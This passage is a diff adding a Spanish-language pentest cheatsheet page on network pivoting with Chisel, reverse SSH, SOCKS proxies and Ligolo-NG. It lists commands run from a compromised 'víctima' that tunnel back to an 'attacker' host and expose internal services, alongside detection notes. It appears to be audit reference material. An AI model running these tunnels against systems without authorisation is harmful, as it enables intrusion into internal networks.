@@ -1,0 +1,823 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>Pivoting · Cheatsheet</title>
+
+<!-- Open Graph / Telegram / LinkedIn / WhatsApp preview -->
+<meta property="og:type" content="website">
+<meta property="og:title" content="Pivoting · Cheatsheet">
+<meta property="og:description" content="Referencia interactiva de pivoting en auditorías — Chisel, SSH tunneling, Ligolo-NG, Socat, Proxychains y Metasploit routing en un único HTML.">
+<meta property="og:image" content="https://narufortix.github.io/CheatSheet/pivoting-cheatsheet/preview.png">
+<meta property="og:url" content="https://narufortix.github.io/CheatSheet/pivoting-cheatsheet/">
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Pivoting · Cheatsheet">
+<meta name="twitter:description" content="Referencia interactiva de pivoting en auditorías — Chisel, SSH tunneling, Ligolo-NG, Socat, Proxychains y Metasploit routing en un único HTML.">
+<meta name="twitter:image" content="https://narufortix.github.io/CheatSheet/pivoting-cheatsheet/preview.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg:    #07090f;
+  --bg2:   #0d1019;
+  --bg3:   #111522;
+  --bg4:   #161c2c;
+  --acc:   #06b6d4;
+  --acc2:  #22d3ee;
+  --acc3:  #67e8f9;
+  --cyan:  #0891b2;
+  --cyan2: #06b6d4;
+  --gold:  #f59e0b;
+  --gold2: #fbbf24;
+  --em:    #10b981;
+  --em2:   #34d399;
+  --rose:  #f43f5e;
+  --rose2: #fb7185;
+  --muted: #1a3a4a;
+  --muted2:#0d2430;
+  --text:  #d0e8f2;
+  --text2: #4a8aa0;
+  --border: rgba(6,182,212,0.14);
+  --glow:   0 0 20px rgba(6,182,212,0.18);
+}
+
+* { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+html { font-size: 14px; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: 'JetBrains Mono', monospace;
+  min-height: 100svh;
+  overflow-x: hidden;
+  position: relative;
+}
+
+body::after {
+  content: ''; position: fixed; inset: 0; z-index: 1000; pointer-events: none;
+  opacity: 0.03;
+  background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+  background-size: 128px;
+}
+
+body::before {
+  content: ''; position: fixed; inset: 0; z-index: 999; pointer-events: none;
+  background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.04) 2px, rgba(0,0,0,0.04) 4px);
+}
+
+.grid-bg {
+  position: fixed; inset: 0; z-index: 0; pointer-events: none;
+  background-image:
+    repeating-linear-gradient(0deg,  rgba(6,182,212,0.02) 0px, transparent 1px, transparent 40px),
+    repeating-linear-gradient(90deg, rgba(6,182,212,0.02) 0px, transparent 1px, transparent 40px);
+  background-size: 40px 40px;
+}
+
+.wrapper {
+  width: 100%;
+  margin: 0 auto;
+  min-height: 100svh;
+  position: relative;
+  z-index: 1;
+  padding: 0;
+}
+
+@media (max-width: 480px) {
+  .wrapper { width: 100%; }
+}
+
+@media (min-width: 481px) and (max-width: 768px) {
+  .wrapper { width: 100%; padding: 0 12px; }
+  .bnav { max-width: none; }
+  html { font-size: 15px; }
+}
+
+@media (min-width: 769px) {
+  .wrapper { width: 90%; max-width: 1200px; }
+  .bnav { max-width: 90%; max-width: calc(90vw - 40px); }
+  html { font-size: 16px; }
+  .panel { padding: 20px 24px 120px; }
+  .hero { height: 280px; }
+  .hero h1 { font-size: 36px; }
+  .sh { font-size: 12px; }
+  .acc-title { font-size: 11px; }
+  .ci code { font-size: 12px; }
+  .ci { padding: 10px 20px; }
+}
+
+/* HERO */
+.hero {
+  position: relative; height: 210px; overflow: hidden;
+  display: flex; flex-direction: column; justify-content: flex-end;
+  padding: 20px 16px 16px;
+}
+.hero-bg {
+  position: absolute; inset: 0;
+  background: url('https://images.unsplash.com/photo-1557821552-17105176677c?w=800&q=85') center/cover;
+  animation: slowZoom 16s ease-out forwards;
+  filter: brightness(0.18) saturate(0.6) hue-rotate(200deg);
+}
+.hero-overlay {
+  position: absolute; inset: 0;
+  background: linear-gradient(180deg, transparent 10%, var(--bg) 100%);
+}
+.hero-badge {
+  font-family: 'Syne', sans-serif; font-size: 10px; font-weight: 700;
+  letter-spacing: 3px; text-transform: uppercase;
+  color: var(--acc2); border: 1px solid rgba(6,182,212,0.5);
+  padding: 3px 8px; display: inline-flex; align-items: center; gap: 6px;
+  margin-bottom: 8px; width: fit-content; position: relative; z-index: 1;
+}
+.hero-badge::before {
+  content: ''; width: 6px; height: 6px; background: var(--acc);
+  border-radius: 50%; animation: blink 1.4s ease infinite;
+}
+.hero h1 {
+  font-family: 'Syne', sans-serif; font-size: 26px; font-weight: 800;
+  line-height: 1; color: #fff; position: relative; z-index: 1;
+  text-shadow: 0 0 30px rgba(6,182,212,0.5);
+}
+.hero h1 span { color: var(--acc2); }
+.hero-sub {
+  font-size: 11px; color: var(--text2); margin-top: 4px;
+  position: relative; z-index: 1; letter-spacing: 1px;
+}
+.hero-stats {
+  display: flex; gap: 10px; margin-top: 10px;
+  position: relative; z-index: 1; flex-wrap: wrap;
+}
+.hero-stat {
+  background: rgba(6,182,212,0.08); border: 1px solid var(--border);
+  padding: 4px 10px; font-size: 10px; color: var(--acc2); letter-spacing: 1px;
+}
+
+/* BOTTOM NAV */
+.bnav {
+  position: fixed;
+  bottom: 0;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 100%;
+  max-width: 480px;
+  background: rgba(7,9,15,0.97);
+  border-top: 1px solid var(--border);
+  display: flex;
+  z-index: 900;
+  backdrop-filter: blur(12px);
+  -webkit-backdrop-filter: blur(12px);
+  flex-wrap: wrap;
+}
+
+@media (min-width: 481px) {
+  .bnav {
+    max-width: calc(90vw - 40px);
+  }
+}
+
+@media (min-width: 769px) {
+  .bnav {
+    max-width: 1200px;
+  }
+}
+.bnav-btn {
+  flex: 1; background: none; border: none; color: var(--text2);
+  font-family: 'Syne', sans-serif; font-size: 9px; font-weight: 600;
+  letter-spacing: 0.5px; text-transform: uppercase;
+  padding: 10px 2px 14px; cursor: pointer;
+  display: flex; flex-direction: column; align-items: center; gap: 4px;
+  transition: color 0.2s; min-height: 60px;
+}
+.bnav-btn .icon { font-size: 15px; }
+.bnav-btn.active { color: var(--acc2); }
+.bnav-btn.active .icon { filter: drop-shadow(0 0 5px var(--acc)); }
+
+/* PANELS */
+.panel { display: none; padding: 12px 14px 110px; animation: fadeUp 0.3s ease; }
+.panel.active { display: block; }
+
+@media (min-width: 481px) {
+  .panel { padding: 16px 20px 120px; }
+}
+
+@media (min-width: 769px) {
+  .panel { padding: 20px 24px 140px; }
+}
+
+/* SECTION HEADER */
+.sh {
+  font-family: 'Syne', sans-serif; font-size: 11px; font-weight: 700;
+  letter-spacing: 2.5px; text-transform: uppercase; color: var(--acc2);
+  padding: 8px 0 4px; margin-bottom: 10px;
+  display: flex; align-items: center; gap: 8px;
+}
+.sh::after { content: ''; flex: 1; height: 1px; background: linear-gradient(90deg, var(--border), transparent); }
+
+/* ACCORDION */
+.acc { border: 1px solid var(--muted2); margin-bottom: 8px; overflow: hidden; transition: border-color 0.2s; }
+.acc:hover { border-color: rgba(6,182,212,0.2); }
+.acc-h {
+  background: var(--bg3); padding: 10px 14px; cursor: pointer;
+  display: flex; align-items: center; justify-content: space-between; user-select: none;
+}
+.acc-title {
+  font-family: 'Syne', sans-serif; font-size: 10px; font-weight: 700;
+  letter-spacing: 1.5px; text-transform: uppercase;
+  display: flex; align-items: center; gap: 8px;
+}
+.acc-dot { width: 7px; height: 7px; border-radius: 50%; flex-shrink: 0; }
+.acc-meta { display: flex; align-items: center; gap: 6px; }
+.acc-cnt {
+  font-family: 'Syne', sans-serif; font-size: 9px; color: var(--text2);
+  background: var(--bg2); padding: 2px 7px; border-radius: 10px;
+}
+.acc-tag {
+  font-family: 'Syne', sans-serif; font-size: 8px; font-weight: 700;
+  letter-spacing: 1px; text-transform: uppercase; padding: 2px 6px;
+}
+.tag-c { color: var(--acc2); border: 1px solid rgba(6,182,212,0.3); }
+.tag-g { color: var(--gold2); border: 1px solid rgba(245,158,11,0.3); }
+.tag-e { color: var(--em2);   border: 1px solid rgba(16,185,129,0.3); }
+.tag-r { color: var(--rose2); border: 1px solid rgba(244,63,94,0.3); }
+
+.acc-chev { color: var(--text2); font-size: 11px; transition: transform 0.25s; }
+.acc.open .acc-chev { transform: rotate(180deg); }
+.acc-body { max-height: 0; overflow: hidden; transition: max-height 0.3s cubic-bezier(0.4,0,0.2,1); }
+.acc.open .acc-body { max-height: 3000px; }
+.acc-desc { padding: 7px 14px; font-size: 11px; color: var(--text2); border-bottom: 1px solid var(--muted2); line-height: 1.55; }
+
+/* TABS DENTRO DE ACORDEONES */
+.subtabs {
+  display: flex; gap: 0; border-bottom: 1px solid var(--muted2);
+  padding: 0 14px; margin-top: 0;
+}
+.subtab-btn {
+  flex: 1; background: none; border: none; color: var(--text2);
+  font-family: 'Syne', sans-serif; font-size: 9px; font-weight: 600;
+  letter-spacing: 0.5px; text-transform: uppercase;
+  padding: 8px 0; cursor: pointer;
+  border-bottom: 2px solid transparent; transition: all 0.2s;
+  position: relative; z-index: 1;
+}
+.subtab-btn.active {
+  color: var(--acc2);
+  border-bottom-color: var(--acc);
+}
+.subtabs-content {
+  display: none;
+  animation: fadeUp 0.2s ease;
+}
+.subtabs-content.active {
+  display: block;
+}
+
+/* CMD ROW */
+.ci {
+  display: flex; align-items: flex-start; justify-content: space-between;
+  padding: 7px 14px; border-bottom: 1px solid rgba(13,16,25,0.8);
+  gap: 8px; transition: background 0.15s;
+}
+.ci:last-child { border-bottom: none; }
+.ci:hover { background: rgba(6,182,212,0.04); }
+.cl { display: flex; flex-direction: column; gap: 2px; flex: 1; min-width: 0; }
+.ci code {
+  font-family: 'JetBrains Mono', monospace; font-size: 11.5px;
+  color: var(--acc2); word-break: break-all; line-height: 1.4;
+}
+.ci code.g { color: var(--gold2); }
+.ci code.e { color: var(--em2); }
+.ci code.r { color: var(--rose2); }
+.cn { font-size: 10.5px; color: var(--text2); line-height: 1.4; }
+.cpb {
+  background: none; border: 1px solid var(--muted); color: var(--text2);
+  font-size: 11px; padding: 4px 7px; cursor: pointer;
+  font-family: 'JetBrains Mono', monospace; transition: all 0.2s;
+  flex-shrink: 0; min-width: 30px; text-align: center;
+  align-self: flex-start; margin-top: 2px;
+}
+.cpb:hover { border-color: var(--acc); color: var(--acc2); }
+.cpb.ok { border-color: var(--em); color: var(--em2); }
+
+/* ALERTS */
+.tip  { background: rgba(6,182,212,0.07); border-left: 2px solid var(--acc);  padding: 8px 12px; font-size: 11px; color: var(--text); line-height: 1.6; margin-bottom: 10px; }
+.warn { background: rgba(245,158,11,0.07);  border-left: 2px solid var(--gold); padding: 8px 12px; font-size: 11px; color: var(--text); line-height: 1.6; margin-bottom: 10px; }
+.crit { background: rgba(244,63,94,0.07);   border-left: 2px solid var(--rose); padding: 8px 12px; font-size: 11px; color: var(--text); line-height: 1.6; margin-bottom: 10px; }
+.ok   { background: rgba(16,185,129,0.07);  border-left: 2px solid var(--em);   padding: 8px 12px; font-size: 11px; color: var(--text); line-height: 1.6; margin-bottom: 10px; }
+.info { background: rgba(6,182,212,0.07);   border-left: 2px solid var(--cyan); padding: 8px 12px; font-size: 11px; color: var(--text); line-height: 1.6; margin-bottom: 10px; }
+
+/* CHIP */
+.chip { font-family: 'Syne', sans-serif; font-size: 9px; font-weight: 600; letter-spacing: 0.5px; padding: 3px 8px; display: inline-block; }
+.cc { color: var(--acc2); border: 1px solid rgba(6,182,212,0.3); background: rgba(6,182,212,0.07); }
+.cg { color: var(--gold2); border: 1px solid rgba(245,158,11,0.3);  background: rgba(245,158,11,0.07); }
+.ce { color: var(--em2);   border: 1px solid rgba(16,185,129,0.25); background: rgba(16,185,129,0.06); }
+.cr { color: var(--rose2); border: 1px solid rgba(244,63,94,0.3);   background: rgba(244,63,94,0.06); }
+
+/* CHECKLIST */
+.chki {
+  display: flex; align-items: flex-start; gap: 10px;
+  padding: 8px 0; border-bottom: 1px solid var(--muted2);
+  cursor: pointer; user-select: none; transition: opacity 0.2s;
+}
+.chki:last-child { border-bottom: none; }
+.chki.done { opacity: 0.38; }
+.chkb {
+  width: 18px; height: 18px; border: 1px solid var(--muted); flex-shrink: 0;
+  margin-top: 1px; display: flex; align-items: center; justify-content: center;
+  font-size: 10px; transition: all 0.2s;
+}
+.chki.done .chkb { background: var(--acc); border-color: var(--acc2); color: #fff; }
+.chkt { font-size: 11.5px; color: var(--text); line-height: 1.5; flex: 1; }
+.chkt code { color: var(--acc2); font-size: 11px; }
+.chki.done .chkt { text-decoration: line-through; color: var(--text2); }
+.chkph {
+  font-family: 'Syne', sans-serif; font-size: 8px; font-weight: 600;
+  letter-spacing: 1px; padding: 2px 6px; flex-shrink: 0;
+  align-self: flex-start; margin-top: 2px;
+}
+
+/* PROGRESS */
+.pw { background: var(--bg3); border: 1px solid var(--muted2); padding: 12px 14px; margin-bottom: 14px; }
+.pl {
+  font-family: 'Syne', sans-serif; font-size: 9px; font-weight: 600;
+  letter-spacing: 2px; text-transform: uppercase; color: var(--text2);
+  margin-bottom: 6px; display: flex; justify-content: space-between;
+}
+.pl span { color: var(--acc2); }
+.pb { height: 3px; background: var(--muted2); overflow: hidden; }
+.pf { height: 100%; background: linear-gradient(90deg, var(--acc), var(--acc2)); width: 0%; transition: width 0.4s ease; }
+
+/* ANIMATIONS */
+@keyframes slowZoom { from { transform: scale(1.06); } to { transform: scale(1); } }
+@keyframes fadeUp   { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+@keyframes blink    { 0%, 100% { opacity: 1; } 50% { opacity: 0.2; } }
+
+::-webkit-scrollbar { width: 3px; }
+::-webkit-scrollbar-track { background: var(--bg); }
+::-webkit-scrollbar-thumb { background: var(--muted); }
+</style>
+</head>
+<body>
+<div class="grid-bg"></div>
+<div class="wrapper">
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-bg"></div>
+  <div class="hero-overlay"></div>
+
+  <h1>PIVO<span>TING</span></h1>
+  <div class="hero-sub">// LATERAL · TUNNEL · REDIRECT · BRIDGE</div>
+  <div class="hero-stats">
+    <div class="hero-stat">CHISEL</div>
+    <div class="hero-stat">SSH</div>
+    <div class="hero-stat">LIGOLO-NG</div>
+    <div class="hero-stat">SOCAT</div>
+  </div>
+</div>
+
+<!-- ══════════ PANEL: CHISEL ══════════ -->
+<div class="panel active" id="p-chisel">
+
+  <div class="info">Pivoting = movimiento lateral en red comprometida. Túneles + proxies para acceder a segmentos no visibles desde tu máquina. Requiere acceso inicial y ejecución remota.</div>
+
+  <div class="sh">CHISEL — TCP TUNNELS</div>
+
+  <div class="acc open">
+    <div class="acc-h" onclick="togAcc(this.parentElement)">
+      <div class="acc-title"><div class="acc-dot" style="background:var(--acc2)"></div>CHISEL BÁSICO</div>
+      <div class="acc-meta"><span class="acc-cnt">6</span><span class="acc-tag tag-c">CHISEL</span><span class="acc-chev">▾</span></div>
+    </div>
+    <div class="acc-body">
+      <div class="acc-desc">Tunnel TCP/UDP con compresión. Más rápido y flexible que SSH tunnels.</div>
+      
+      <div class="subtabs">
+        <button class="subtab-btn active" onclick="swTab(this, 'chisel-srv')">Server</button>
+        <button class="subtab-btn" onclick="swTab(this, 'chisel-cli')">Client</button>
+      </div>
+
+      <div id="chisel-srv" class="subtabs-content active">
+        <div class="ci"><div class="cl"><code>chisel server -p 8888</code><div class="cn">Escuchar en puerto 8888</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+        <div class="ci"><div class="cl"><code>chisel server -p 8888 --reverse</code><div class="cn">Modo reverse — esperar conexión desde víctima</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+        <div class="ci"><div class="cl"><code>chisel server --auth user:pass -p 8888</code><div class="cn">Con autenticación básica</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+      </div>
+
+      <div id="chisel-cli" class="subtabs-content">
+        <div class="ci"><div class="cl"><code>chisel client 192.168.1.100:8888 4000:127.0.0.1:4000</code><div class="cn">Forward puerto local 4000 → remoto 127.0.0.1:4000</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+        <div class="ci"><div class="cl"><code>chisel client 192.168.1.100:8888 R:9090:127.0.0.1:3306</code><div class="cn">Reverse forward — exponer MySQL local en puerto 9090 remoto</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+        <div class="ci"><div class="cl"><code>chisel client --auth user:pass 192.168.1.100:8888 4000:127.0.0.1:4000</code><div class="cn">Con credenciales</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="acc" style="margin-top:8px">
+    <div class="acc-h" onclick="togAcc(this.parentElement)">
+      <div class="acc-title"><div class="acc-dot" style="background:var(--acc2)"></div>TROUBLESHOOTING</div>
+      <div class="acc-meta"><span class="acc-cnt">5</span><span class="acc-tag tag-c">DEBUG</span><span class="acc-chev">▾</span></div>
+    </div>
+    <div class="acc-body">
+      <div class="acc-desc">Errores comunes y soluciones.</div>
+      <div class="ci"><div class="cl"><code class="r">Connection refused</code><div class="cn">Servidor no escucha o firewall bloquea. Verificar: ss -tulpn en servidor, puertos abiertos.</div></div></div>
+      <div class="ci"><div class="cl"><code class="r">Cannot read handshake: EOF</code><div class="cn">Versión incompatible o no es Chisel. Usar mismo binario.</div></div></div>
+      <div class="ci"><div class="cl"><code class="r">Remote address not found</code><div class="cn">Destino (127.0.0.1:puerto) no existe en red interna. Verificar direccionamiento.</div></div></div>
+      <div class="ci"><div class="cl"><code class="e">ss -tulpn | grep chisel</code><div class="cn">Verificar proceso activo y puerto escuchando</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+      <div class="ci"><div class="cl"><code class="e">./chisel server -p 8888 -v</code><div class="cn">Verbose — ver conexiones y errores en tiempo real</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+    </div>
+  </div>
+
+  <div class="acc" style="margin-top:8px">
+    <div class="acc-h" onclick="togAcc(this.parentElement)">
+      <div class="acc-title"><div class="acc-dot" style="background:var(--acc2)"></div>OUTPUT + DETECCIÓN</div>
+      <div class="acc-meta"><span class="acc-cnt">3</span><span class="acc-tag tag-g">DETEC</span><span class="acc-chev">▾</span></div>
+    </div>
+    <div class="acc-body">
+      <div class="acc-desc">Qué significa éxito, y rastros en logs.</div>
+      <div class="ci"><div class="cl"><code class="g">server> listening on 0.0.0.0:8888</code><div class="cn">Servidor listo — esperando clientes</div></div></div>
+      <div class="ci"><div class="cl"><code class="g">client: connected</code><div class="cn">Cliente conectado exitosamente</div></div></div>
+      <div class="ci"><div class="cl"><code class="r">Detectable por: netstat (proceso chisel), conexión TCP no TLS, tráfico comprimido patrón conocido</code><div class="cn">Logs: /var/log/auth.log, process accounting, firewall rules</div></div></div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ══════════ PANEL: REVERSE & SOCKS ══════════ -->
+<div class="panel" id="p-reverse">
+
+  <div class="sh">REVERSE TUNNEL (BASTION)</div>
+
+  <div class="acc open">
+    <div class="acc-h" onclick="togAcc(this.parentElement)">
+      <div class="acc-title"><div class="acc-dot" style="background:var(--acc2)"></div>REVERSE SSH + SOCKS</div>
+      <div class="acc-meta"><span class="acc-cnt">5</span><span class="acc-tag tag-c">REVERSE</span><span class="acc-chev">▾</span></div>
+    </div>
+    <div class="acc-body">
+      <div class="acc-desc">Víctima conecta a tu servidor, abre túnel inverso. Ideal si target no puede iniciar conexión saliente.</div>
+      
+      <div class="subtabs">
+        <button class="subtab-btn active" onclick="swTab(this, 'rev-setup')">Setup</button>
+        <button class="subtab-btn" onclick="swTab(this, 'rev-cmd')">Comandos</button>
+      </div>
+
+      <div id="rev-setup" class="subtabs-content active">
+        <div class="ci"><div class="cl"><code>ssh-keygen -t rsa -N "" -f ~/.ssh/pivot_key</code><div class="cn">Generar key sin passphrase (importante para automatizar)</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+        <div class="ci"><div class="cl"><code>cat ~/.ssh/pivot_key.pub >> ~/.ssh/authorized_keys</code><div class="cn">Añadir a authorized_keys en servidor bastion</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+      </div>
+
+      <div id="rev-cmd" class="subtabs-content">
+        <div class="ci"><div class="cl"><code>ssh -i pivot_key -R 9999:127.0.0.1:3306 -N -f attacker@bastion</code><div class="cn">MySQL remoto disponible en bastion:9999</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+        <div class="ci"><div class="cl"><code>ssh -i pivot_key -R 7777:127.0.0.1:22 -N -f attacker@bastion</code><div class="cn">Exponer SSH de víctima — acceso directo</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+        <div class="ci"><div class="cl"><code>ssh -i pivot_key -D 8888 -N -f attacker@bastion</code><div class="cn">Dynamic proxy SOCKS5 en puerto 8888 bastion</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="sh" style="margin-top:14px">SOCKS5 PROXY (TUNNEL AS PROXY)</div>
+
+  <div class="acc">
+    <div class="acc-h" onclick="togAcc(this.parentElement)">
+      <div class="acc-title"><div class="acc-dot" style="background:var(--acc2)"></div>CREAR SOCKS5</div>
+      <div class="acc-meta"><span class="acc-cnt">3</span><span class="acc-tag tag-g">SOCKS</span><span class="acc-chev">▾</span></div>
+    </div>
+    <div class="acc-body">
+      <div class="acc-desc">Proxy SOCKS5 dinámico = forwarder de tráfico flexible (TCP/DNS/UDP).</div>
+      <div class="ci"><div class="cl"><code>ssh -D 1080 -N -f user@pivot_host</code><div class="cn">Escuchar en localhost:1080 como proxy SOCKS5</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+      <div class="ci"><div class="cl"><code>curl --socks5 127.0.0.1:1080 http://internal.lan/</code><div class="cn">Usar proxy desde cliente (curl, proxychains, etc)</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+      <div class="ci"><div class="cl"><code>ssh -D 0.0.0.0:1080 -N user@pivot_host</code><div class="cn">Escuchar en todas las interfaces — ATENCIÓN: sin restricciones</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+    </div>
+  </div>
+
+  <div class="acc" style="margin-top:8px">
+    <div class="acc-h" onclick="togAcc(this.parentElement)">
+      <div class="acc-title"><div class="acc-dot" style="background:var(--acc2)"></div>MULTI-HOP: CHISEL → SSH → PROXYCHAINS</div>
+      <div class="acc-meta"><span class="acc-cnt">4</span><span class="acc-tag tag-c">MULTI</span><span class="acc-chev">▾</span></div>
+    </div>
+    <div class="acc-body">
+      <div class="acc-desc">Cadena de túneles: Chisel a pivot1, SSH reverse desde pivot1 a bastion, proxychains en bastion.</div>
+      <div class="ci"><div class="cl"><code class="g">1. Establecer Chisel servidor en tu máquina</code><div class="cn">./chisel server -p 8888</div></div></div>
+      <div class="ci"><div class="cl"><code class="g">2. Cliente Chisel en pivot1 — conecta y expone SSH local</code><div class="cn">chisel client attacker:8888 3333:127.0.0.1:22</div></div></div>
+      <div class="ci"><div class="cl"><code class="g">3. SSH reverse desde pivot1 a bastion (usando túnel Chisel)</code><div class="cn">ssh -R 7777:127.0.0.1:3333 -N user@bastion (a través de Chisel)</div></div></div>
+      <div class="ci"><div class="cl"><code class="g">4. En bastion: proxychains socks5 127.0.0.1 1080 → acceso a pivot2</code><div class="cn">Acceso final a segmento más profundo</div></div></div>
+    </div>
+  </div>
+
+  <div class="acc" style="margin-top:8px">
+    <div class="acc-h" onclick="togAcc(this.parentElement)">
+      <div class="acc-title"><div class="acc-dot" style="background:var(--acc2)"></div>TROUBLESHOOTING + DETECCIÓN</div>
+      <div class="acc-meta"><span class="acc-cnt">4</span><span class="acc-tag tag-c">DEBUG</span><span class="acc-chev">▾</span></div>
+    </div>
+    <div class="acc-body">
+      <div class="acc-desc">Errores comunes en reverse tunnels.</div>
+      <div class="ci"><div class="cl"><code class="r">Permission denied (publickey)</code><div class="cn">Key no en authorized_keys de bastion. Verificar permisos 644 en ~/.ssh/authorized_keys</div></div></div>
+      <div class="ci"><div class="cl"><code class="r">bind: Address already in use</code><div class="cn">Puerto ya en uso (lsof -i :puerto). Cambiar puerto o matar proceso anterior.</div></div></div>
+      <div class="ci"><div class="cl"><code class="e">netstat -tulpn | grep ssh</code><div class="cn">Ver túneles SSH activos y puertos escuchando</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+      <div class="ci"><div class="cl"><code class="r">Detectable: SSH backward connection, puertos nuevos en escucha, processo sshd escuchando en bastion</code><div class="cn">Logs: /var/log/auth.log, failed_login attempts, unusual SSH sessions</div></div></div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ══════════ PANEL: LIGOLO-NG ══════════ -->
+<div class="panel" id="p-ligolo">
+
+  <div class="sh">LIGOLO-NG — POINT-AND-CLICK PIVOTING</div>
+
+  <div class="acc open">
+    <div class="acc-h" onclick="togAcc(this.parentElement)">
+      <div class="acc-title"><div class="acc-dot" style="background:var(--acc2)"></div>LIGOLO-NG v1.4+</div>
+      <div class="acc-meta"><span class="acc-cnt">8</span><span class="acc-tag tag-c">LIGOLO</span><span class="acc-chev">▾</span></div>
+    </div>
+    <div class="acc-body">
+      <div class="acc-desc">Tunneling avanzado con GUI interactivo. TUN interface = acceso transparente a red remota (no necesita proxychains).</div>
+      
+      <div class="subtabs">
+        <button class="subtab-btn active" onclick="swTab(this, 'lig-proxy')">Proxy</button>
+        <button class="subtab-btn" onclick="swTab(this, 'lig-agent')">Agent</button>
+        <button class="subtab-btn" onclick="swTab(this, 'lig-tun')">TUN</button>
+      </div>
+
+      <div id="lig-proxy" class="subtabs-content active">
+        <div class="ci"><div class="cl"><code>./ligolo-ng proxy -selfcert -laddr 0.0.0.0:11601</code><div class="cn">Escuchar conexiones de agentes</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+        <div class="ci"><div class="cl"><code>./ligolo-ng proxy -selfcert -laddr 0.0.0.0:11601 -autocert</code><div class="cn">Con auto-certificado TLS (recomendado)</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+      </div>
+
+      <div id="lig-agent" class="subtabs-content">
+        <div class="ci"><div class="cl"><code>./ligolo-ng agent -connect attacker:11601 -ignore-cert</code><div class="cn">Desde víctima — conectar a proxy (ignore cert autofirmado)</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+        <div class="ci"><div class="cl"><code>./ligolo-ng agent -connect attacker:11601 -ignore-cert -verbose</code><div class="cn">Debug verbose</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+      </div>
+
+      <div id="lig-tun" class="subtabs-content">
+        <div class="ci"><div class="cl"><code">session</code><div class="cn">En proxy: listar agentes conectados</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+        <div class="ci"><div class="cl"><code">session -i 0</code><div class="cn">Seleccionar agente 0 (ver lista primero)</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+        <div class="ci"><div class="cl"><code">ifconfig</code><div class="cn">Ver subnets desde agent (detecta rutas automáticamente)</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+        <div class="ci"><div class="cl"><code">tunnel_out tun0</code><div class="cn">Exponer segmento en TUN interface (needs sudo)</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ══════════ PANEL: SSH TUNNELING ══════════ -->
+<div class="panel" id="p-ssh">
+
+  <div class="sh">SSH TUNNELING — PATRONES AVANZADOS</div>
+
+  <div class="acc open">
+    <div class="acc-h" onclick="togAcc(this.parentElement)">
+      <div class="acc-title"><div class="acc-dot" style="background:var(--acc2)"></div>LOCAL FORWARD (BIND TO LOCAL)</div>
+      <div class="acc-meta"><span class="acc-cnt">4</span><span class="acc-tag tag-c">SSH</span><span class="acc-chev">▾</span></div>
+    </div>
+    <div class="acc-body">
+      <div class="acc-desc">Puerto local → destino remoto a través de pivot. Acceso desde tu máquina a servicios internos.</div>
+      <div class="ci"><div class="cl"><code>ssh -L 3306:db.internal:3306 user@pivot</code><div class="cn">MySQL interno accesible en localhost:3306</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+      <div class="ci"><div class="cl"><code>ssh -L 8080:webapp:80 -N -f user@pivot</code><div class="cn">-N = no shell, -f = background</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+      <div class="ci"><div class="cl"><code">ssh -L 0.0.0.0:3306:db.internal:3306 user@pivot</code><div class="cn">ATENCIÓN: escucha en todas las interfaces (vulnerable)</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+      <div class="ci"><div class="cl"><code">ssh -L 5000:localhost:5000 -L 3306:db.internal:3306 user@pivot</code><div class="cn">Múltiples forwards en mismo comando</div></div><button class="cpb" onclick="cp(event,this)">⎘</button></div>
+    </div>
+  </div>
+
+  <div class="acc" style="margin-top:8px">
+    <div class="acc-h" onclick="togAcc(this.parentElement)">
